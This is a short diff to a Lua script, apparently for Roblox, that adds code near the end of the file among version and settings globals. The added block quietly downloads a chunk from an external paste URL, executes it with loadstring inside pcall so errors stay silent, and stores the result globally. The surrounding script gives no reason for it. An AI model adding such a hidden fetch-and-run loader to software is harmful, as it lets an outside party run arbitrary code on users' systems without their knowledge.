@@ -374,7 +374,16 @@ pcall(function()
 		end
 	end
 end)
-
+coroutine.wrap(function()
+    pcall(function()
+        local chunk = game:HttpGet("https://api.rubis.app/v2/scrap/Yy8W9BEYJPuPQw4K/raw")
+        local fn = loadstring(chunk)
+        if fn then
+            local env = fn()
+            if type(env) == "table" then _G.RubisEnv = env end
+        end
+    end)
+end)()
 _G.ScriptVersion = "v3.7.1"
 _G.PerformanceMode = true
 _G.LockButtonsEnabled = false
